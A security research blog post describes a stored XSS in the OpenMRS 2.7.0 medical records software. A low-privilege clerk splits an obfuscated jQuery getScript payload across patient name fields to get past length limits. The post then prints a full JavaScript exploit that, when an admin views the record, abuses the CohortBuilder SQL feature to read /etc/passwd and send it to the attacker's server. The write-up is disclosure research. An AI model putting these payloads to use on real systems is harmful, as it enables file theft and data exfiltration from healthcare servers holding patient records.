---
layout: post
title: From XSS to Local File Read Bypassing Payload Length Restrictions
excerpt_separator: <!--more-->

---

In this post, we will discuss a stored XSS vulnerability found in one of the popular opensource medical records management software *OpenMRS 2.7.0*. The security research conducted for this software revealed many critical vulnerabilities ranging from Authenticated Remote Code Execution via Java Deserialization to Privilege Escalation and had been reported to vendor around 9 months back. 
<!--more-->

We will have a look at how a user with `clerk` privileges can leverage Jquery to overcome length restrictions in a Stored XSS payload and can read local system files by exploiting one of the application features.

## Load .js with getScript()

In this case, the exploit vector was any patient's `fullname` but each field had a charset limitation of around 50 characters and as our payload was gettting placed inside `html` context so it was impossible to weaponize our exploit to exfiltrate any information and I am really not a fan of showing popups because in real world if someone is going to leverage a client side exploit they certainly won't show any popups ;P.

So for the sake of creating a nice POC, I setlled with the following payload where we are using JQuery's `getScript()` function to load an external JavaScript from attacker's server.

```html
foo</script><script>$.getScript(String.fromCharCode(104,116,116,112,58,47,47,120,115,115,47,116,46,106,115),1)</script>bar
```

We divided the payload across name fields of patient's name, overcomming the payload length restrictions.

   ```javascript
      givenName = foo</script><script>$.getScript(
      middleName = String.fromCharCode(104,116,116,112,58,47,47,120,
      familyName = 115,115,47,116,46,106,115),1)</script>bar
   ```

![](/assets/images/xss_to_lfr/1.png)


The reason of having `foo` and `bar` in our payload was to pose a legitimate Patient name and hide our payload from Patient search results.

![](/assets/images/xss_to_lfr/2.png)

## Reading Local System Files

Now comes the interesting part, the application provides a feature name `CohortBuilder` which allows `Admin` users to execute `asynchronous` SQL queries and fetch results by triggering `getLastResult.dwr` http request. After understanding this workflow, we wrote the following javascript exploit and hosted it on our server.


{% highlight javascript %}

function x()
    {
  	var x1 = new XMLHttpRequest();
  	x1.open("POST", "http:\/\/openmrs:8081\/openmrs-standalone\/cohortBuilder.form", true);
  	x1.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
  	x1.withCredentials = true;
  	var body = "method=addDynamicFilter&filterClass=org.openmrs.module.reportingcompatibility.reporting.SqlPatientFilter&vars=query%23java.lang.String&query=select+hex%28load_file%28%27%2Fetc%2Fpasswd%27%29%29%3B";
  	var aBody = new Uint8Array(body.length);
  	for (var i = 0; i < aBody.length; i++)
  	  aBody[i] = body.charCodeAt(i); 
  	x1.send(new Blob([aBody]));
  	y();
    }
   
function y()
   {
 	var r;
 	var xhr = new XMLHttpRequest();
 	xhr.open("POST", "http:\/\/openmrs:8081\/openmrs-standalone\/ms\/call\/plaincall\/DWRCohortBuilderService.getLastResult.dwr", true);
 	xhr.setRequestHeader("Content-Type", "text\/plain");
 	xhr.withCredentials = true;
 	
 	var body = "callCount=1\n" + 
 	  "page=/openmrs-standalone/cohortBuilder.list\n" + 
 	  "httpSessionId=\n" + 
 	  "scriptSessionId=2D46415AFBB2267F3E2CECC665080196135\n" + 
 	  "c0-scriptName=DWRCohortBuilderService\n" + 
 	  "c0-methodName=getLastResult\n" + 
 	  "c0-id=0\n" + 
 	  "batchId=0\n";
 	var aBody = new Uint8Array(body.length);
 	for (var i = 0; i < aBody.length; i++)
 	  aBody[i] = body.charCodeAt(i); 
 	
 	xhr.onload = function(){
 		r = xhr.response;
 		exfil(r);
 	}
 	xhr.responseType = "text";
 	xhr.send(new Blob([aBody]));
   }
function exfil(r)
   {
 	var x1 = new XMLHttpRequest();
 	x1.open("POST", "http:\/\/localhost:80\/", true);
 	x1.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
 	x1.withCredentials = true;
 	var body = r;
 	var aBody = new Uint8Array(body.length);
 	for (var i = 0; i < aBody.length; i++)
 	  aBody[i] = body.charCodeAt(i); 
 	x1.send(new Blob([aBody]));
   }
   x()
{% endhighlight %}


Now, when an `Admin` user clicks on the search result and then `Edit` the patient details as shown, the application executes our payload and send the *hex encoded* contents of `/etc/passwd` file to our server.

![](/assets/images/xss_to_lfr/3.png){: .center-image }

![](/assets/images/xss_to_lfr/final.jpg)

![](/assets/images/xss_to_lfr/4.png)

